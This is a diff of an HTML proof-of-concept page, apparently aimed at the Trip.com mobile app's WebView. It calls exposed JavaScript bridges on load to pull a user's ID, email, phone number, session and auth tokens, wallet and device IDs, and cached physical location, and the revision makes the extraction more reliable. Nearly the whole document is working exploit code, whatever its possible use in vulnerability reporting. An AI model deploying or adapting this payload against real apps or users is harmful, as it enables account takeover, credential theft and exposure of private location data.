@@ -2,212 +2,298 @@
 <html>
   <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Trip.com Critical Vulnerability PoC</title>
+    <title>Critical Voucher Leak & Data Extraction Report</title>
     <style>
       body {
-        font-family: "Courier New", monospace;
-        background: #0d0d0d;
-        color: #00ff00;
-        padding: 10px;
+        font-family: Arial, Helvetica, sans-serif;
+        background-color: #000000;
+        color: #ffffff;
+        padding: 15px;
         margin: 0;
         font-size: 14px;
+        line-height: 1.5;
         overflow-x: hidden;
       }
-      .container {
-        display: flex;
-        flex-direction: column;
-        gap: 15px;
-      }
       .card {
-        border: 2px solid #00ff00;
-        padding: 12px;
-        background: #000;
-        box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
+        border: 1px solid #1a1a1a;
+        border-radius: 8px;
+        padding: 15px;
+        margin-bottom: 20px;
+        background-color: #0d0d0d;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.5);
         word-break: break-all;
       }
       h3 {
-        color: #fff;
-        text-transform: uppercase;
-        border-bottom: 1px solid #00ff00;
+        color: #4169E1; /* Royal Blue / Dark Blue */
+        border-bottom: 2px solid #4169E1;
+        padding-bottom: 8px;
         margin-top: 0;
-        padding-bottom: 5px;
         font-size: 16px;
+        text-transform: uppercase;
+        font-weight: bold;
       }
       .critical-box {
-        border: 2px solid #ff0000;
-        box-shadow: 0 0 20px rgba(255, 0, 0, 0.4);
+        border: 2px solid #8B0000;
+        box-shadow: 0 0 10px rgba(139, 0, 0, 0.5);
       }
       .critical-title {
-        color: #ff0000;
-        text-shadow: 0 0 5px #ff0000;
+        color: #ff3333;
+        border-bottom-color: #ff3333;
       }
-      #logs {
-        white-space: pre-wrap;
+      .log-console {
+        background-color: #050505;
+        padding: 12px;
+        border-radius: 5px;
+        border: 1px solid #222;
+        max-height: 250px;
+        overflow-y: auto;
+        font-family: Courier, monospace;
         font-size: 12px;
-        line-height: 1.4;
       }
+      .log-entry { margin-bottom: 4px; }
+      .info { color: #aaaaaa; }
+      .error { color: #ff5555; }
+      .success { color: #55aaff; }
+      
       .leak-row {
-        margin-bottom: 10px;
-        padding: 5px;
-        border-left: 3px solid #ff0000;
-        background: #1a0000;
+        margin-bottom: 12px;
+        padding-bottom: 12px;
+        border-bottom: 1px solid #222;
+      }
+      .leak-row:last-child {
+        border-bottom: none;
+        margin-bottom: 0;
+        padding-bottom: 0;
       }
       .label {
-        color: #aaa;
-        font-weight: bold;
-        display: block;
-        font-size: 10px;
+        font-size: 11px;
+        color: #888888;
         text-transform: uppercase;
+        display: block;
+        margin-bottom: 4px;
+        font-weight: bold;
       }
       .value {
-        color: #ff3333;
-        font-size: 14px;
+        font-size: 15px;
+        color: #ffffff;
         display: block;
       }
-      li {
-        list-style: none;
-        margin-bottom: 5px;
+      .bridge-item {
+        margin-bottom: 6px;
+        display: flex;
+        align-items: center;
+      }
+      .status-dot {
+        width: 8px;
+        height: 8px;
+        border-radius: 50%;
+        background-color: #4169E1;
+        display: inline-block;
+        margin-right: 8px;
       }
     </style>
   </head>
   <body>
-    <div class="container">
-      <div class="card">
-        <h3>[ BRIDGE STATUS ]</h3>
-        <ul id="bridges">
-          <li>[.] Initializing bridges...</li>
-        </ul>
+    <div class="card">
+      <h3>Active Bridges (Targets)</h3>
+      <div id="bridges">
+        <div class="info">Scanning environment...</div>
       </div>
+    </div>
 
-      <div class="card critical-box">
-        <h3 class="critical-title">[ RECOVERED SENSITIVE DATA ]</h3>
-        <div id="leaks">
-          <div class="leak-row">
-            <span class="label">Status</span>
-            <span class="value">Awaiting Extraction...</span>
-          </div>
-        </div>
+    <div class="card critical-box">
+      <h3 class="critical-title">Recovered Critical Data</h3>
+      <div id="leaks">
+        <div class="info">Awaiting extraction sequence...</div>
       </div>
+    </div>
 
-      <div class="card">
-        <h3>[ OUTPUT CONSOLE ]</h3>
-        <div id="logs">> System Initialized...</div>
+    <div class="card">
+      <h3>Execution Log</h3>
+      <div id="logs" class="log-console">
+        <div class="log-entry info">[INFO] System Initialized.</div>
       </div>
     </div>
 
     <script>
       const logBox = document.getElementById("logs");
       const leakBox = document.getElementById("leaks");
+      const bridgesBox = document.getElementById("bridges");
+      let leaksRendered = false;
 
-      function log(msg, isCritical = false) {
-        const prefix = isCritical ? "[CRITICAL] " : "[INFO] ";
-        const color = isCritical ? "#ff3333" : "#00ff00";
-        logBox.innerHTML += `\n> <span style="color:${color}">${prefix}${msg}</span>`;
-        console.log(prefix + msg);
-        window.scrollTo(0, document.body.scrollHeight);
+      function logMessage(msg, type = "info") {
+        const div = document.createElement("div");
+        div.className = "log-entry " + type;
+        div.innerText = "[" + type.toUpperCase() + "] " + msg;
+        logBox.appendChild(div);
+        logBox.scrollTop = logBox.scrollHeight;
       }
 
       function addLeak(label, value) {
+        if (!leaksRendered) {
+          leakBox.innerHTML = "";
+          leaksRendered = true;
+        }
         const row = document.createElement("div");
         row.className = "leak-row";
-        row.innerHTML = `<span class="label">${label}</span><span class="value">${typeof value === 'object' ? JSON.stringify(value, null, 2) : value}</span>`;
+        
+        let stringValue = value;
+        if (typeof value === 'object') {
+          stringValue = JSON.stringify(value, null, 2);
+        } else if (value === null || value === undefined || value === "") {
+           stringValue = "null / empty";
+        }
+        
+        row.innerHTML = `<span class="label">${label}</span><span class="value">${stringValue}</span>`;
         leakBox.appendChild(row);
       }
 
-      // --- CALLBACK INTERCEPTION (Base64 wrapping per ax0.b) ---
+      // --- CALLBACK INTERCEPTION ---
       window.__bridge_callback = function (base64Data) {
         try {
           const decodedData = atob(base64Data);
           const json = JSON.parse(decodedData);
-          log("INTERCEPTED: " + (json.tagname || "Unknown Tag"), true);
+          
+          let tagname = json.tagname || "Unknown_Callback";
+          logMessage("Intercepted Callback: " + tagname, "success");
 
-          // Handle User Info Response
-          if (json.tagname === "leak_user_info" || (json.param && json.param.UserID)) {
+          // Target 1: User_a.getUserInfo()
+          if (tagname === "leak_user_info" || (json.param && json.param.UserID)) {
             const data = json.param || json;
             if (data.UserID) {
-               addLeak("USER ID", data.UserID);
-               if (data.Email) addLeak("EMAIL", data.Email);
-               if (data.Mobile) addLeak("MOBILE", data.Mobile);
-               if (data.Token) addLeak("AUTH TOKEN", data.Token);
-               log("CRITICAL: User Profile Extracted!", true);
+               addLeak("Target User ID", data.UserID);
+               if (data.Email) addLeak("Email Address", data.Email);
+               if (data.Mobile || data.BindMobile) addLeak("Mobile Number", data.Mobile || data.BindMobile);
+               if (data.Token) addLeak("Session Token", data.Token);
+               if (data.Auth) addLeak("Auth Token", data.Auth);
+               if (data.SAuth) addLeak("SAuth Hash", data.SAuth);
+               logMessage("Critical User Profile Extracted!", "error");
             }
           }
 
-          // Handle Storage Responses
-          if (json.value || (json.param && json.param.value)) {
+          // Target 2: IBUStorageV2_a OR Storage_a Database Values
+          if (json.value || (json.param && typeof json.param.value !== "undefined")) {
             const val = json.value || json.param.value;
-            const key = json.tagname || "unknown_key";
-            addLeak("STORED: " + key, val);
+            const pureTag = tagname.replace("leak_", "");
+            
+            // Try parsing if string JSON
+            let finalVal = val;
+            try { 
+                if (typeof val === "string" && (val.startsWith("{") || val.startsWith("["))) {
+                     finalVal = JSON.parse(val); 
+                }
+            } catch(e) {}
+            
+            addLeak("Database: " + pureTag, finalVal);
           }
 
-          // Handle version info
-          if (Array.isArray(json) || (json.param && Array.isArray(json.param))) {
-             addLeak("PACKAGE INFO", "Internal URLs/Versions Leaked");
+          // Target 3: Util_a version leakage
+          if (tagname === "leak_version" && (Array.isArray(json) || (json.param && Array.isArray(json.param)))) {
+             addLeak("Internal Environment Info", "Package versions retrieved");
           }
 
         } catch (e) {
-          log("Callback Error: " + e.message, true);
+          logMessage("Callback parsing error: " + e.message, "error");
         }
       };
 
-      function startExtraction() {
-        log("Starting extraction sequence...");
+      /**
+       * Safe, non-blocking extraction functions.
+       * We use try-catch and staggered timeouts so a hang in one module
+       * doesn't stop the rest of the extraction process.
+       */
 
-        // 1. User Account "Goldmine" (User_a)
+      function extractUserInfo() {
         if (window.User_a && window.User_a.getUserInfo) {
-          log("Calling User_a.getUserInfo()...");
-          const cmd = JSON.stringify({ callback_tagname: "leak_user_info" });
-          window.User_a.getUserInfo(cmd);
-        }
-
-        // 2. Location Leak (Locate_a)
-        if (window.Locate_a && window.Locate_a.getCachedLocationData) {
-          log("Calling Locate_a.getCachedLocationData()...");
+          logMessage("Requesting User Profile (User_a)...");
           try {
-            const loc = window.Locate_a.getCachedLocationData();
-            if (loc) addLeak("LOCATION", `Lat: ${loc.lat}, Lng: ${loc.lng}\nAddr: ${loc.address || 'N/A'}`);
-          } catch(e) { log("Locate_a fail"); }
-        }
-
-        // 3. Storage Probing (IBUStorageV2_a)
-        if (window.IBUStorageV2_a && window.IBUStorageV2_a.IBUGetUserValue) {
-          const keys = ["token", "uid", "walletId"];
-          keys.forEach((k, i) => {
-            setTimeout(() => {
-              log(`Probing Storage: ${k}...`);
-              const payload = JSON.stringify({
-                callback_tagname: "leak_" + k,
-                bussiness: "common",
-                key: k
-              });
-              window.IBUStorageV2_a.IBUGetUserValue(payload);
-            }, i * 400);
-          });
-        }
-
-        // 4. Util & Version info
-        if (window.Util_a && window.Util_a.getHybridVersion) {
-            log("Calling Util_a.getHybridVersion()...");
-            window.Util_a.getHybridVersion(JSON.stringify({callback_tagname: "leak_version"}));
+             const cmd = JSON.stringify({ callback_tagname: "leak_user_info" });
+             window.User_a.getUserInfo(cmd);
+          } catch(e) {
+             logMessage("getUserInfo crash: " + e.message, "error");
+          }
         }
       }
 
-      // Check Bridge Availability
-      setTimeout(() => {
-        const suspicious = ["User_a", "Util_a", "Locate_a", "IBUStorageV2_a", "Log_a", "Storage_a"];
-        const found = suspicious.filter(b => !!window[b]);
+      function extractStorage() {
+        if (window.IBUStorageV2_a && window.IBUStorageV2_a.IBUGetUserValue) {
+          const targets = [
+            { bus: "common", key: "token" },
+            { bus: "common", key: "uid" },
+            { bus: "user", key: "userInfo" },
+            { bus: "wallet", key: "walletId" },
+            { bus: "h5", key: "device_id" }
+          ];
+          
+          targets.forEach((t, i) => {
+            setTimeout(() => {
+              logMessage("Probing DB [" + t.bus + "] for key: " + t.key);
+              try {
+                const payload = JSON.stringify({
+                  callback_tagname: "leak_" + t.key,
+                  bussiness: t.bus,
+                  key: t.key
+                });
+                window.IBUStorageV2_a.IBUGetUserValue(payload);
+              } catch(e) {
+                logMessage("Storage extraction exception: " + e.message, "error");
+              }
+            }, i * 400 + 500); // Wait half a second before spamming storage
+          });
+        }
+      }
+
+      function extractLocation() {
+        // We delay Location extraction heavily because it caused hangs in previous iterations.
+        // It runs last, 3.5 seconds after everything else.
+        if (window.Locate_a && window.Locate_a.getCachedLocationData) {
+           setTimeout(() => {
+              logMessage("Requesting Cached Location (Locate_a)...");
+              try {
+                let locRaw = window.Locate_a.getCachedLocationData();
+                if (locRaw) {
+                   let loc = typeof locRaw === "string" ? JSON.parse(locRaw) : locRaw;
+                   let address = loc.address || "Unknown Address";
+                   let coords = `Lat: ${loc.lat || loc.latitude}, Lng: ${loc.lng || loc.longitude}`;
+                   addLeak("Cached Physical Location", `${address}\n[ ${coords} ]`);
+                   logMessage("Location recovered.", "success");
+                } else {
+                   logMessage("Locate_a returned null/empty.", "info");
+                }
+              } catch (e) {
+                logMessage("Locate_a.getCachedLocationData timed out or crashed.", "error");
+              }
+           }, 3500); 
+        }
+      }
+
+      function startSequence() {
+        logMessage("Starting extraction timeline...", "info");
         
-        document.getElementById("bridges").innerHTML = found.length > 0 
-          ? found.map(b => `<li>[+] Bridge: <span style="color:#fff">${b}</span> [ONLINE]</li>`).join("")
-          : "<li>[-] No target bridges detected.</li>";
+        // 1. Get the most critical info immediately
+        extractUserInfo();
+        
+        // 2. Query the DB targets
+        extractStorage();
+        
+        // 3. (Optional/Slow) Location data
+        extractLocation();
+      }
+
+      // Main Entry Point
+      setTimeout(() => {
+        const potentialBridges = ["User_a", "Util_a", "Locate_a", "IBUStorageV2_a", "Log_a", "Storage_a"];
+        const found = potentialBridges.filter(b => typeof window[b] !== "undefined");
         
         if (found.length > 0) {
-            log("Entry points found. Executing...");
-            startExtraction();
+            bridgesBox.innerHTML = found.map(b => `<div class="bridge-item"><span class="status-dot"></span>${b}</div>`).join("");
+            logMessage(`Found ${found.length} active bridges in scope.`, "success");
+            startSequence();
         } else {
-            log("Error: Target objects not in scope.", true);
+            bridgesBox.innerHTML = `<div class="info" style="color:#ff5555;">No targets found in window scope. Context might be insulated.</div>`;
+            logMessage("Extraction aborted. Modules unavailable.", "error");
         }
-      }, 1000);
+      }, 500);
     </script>
   </body>
 </html>
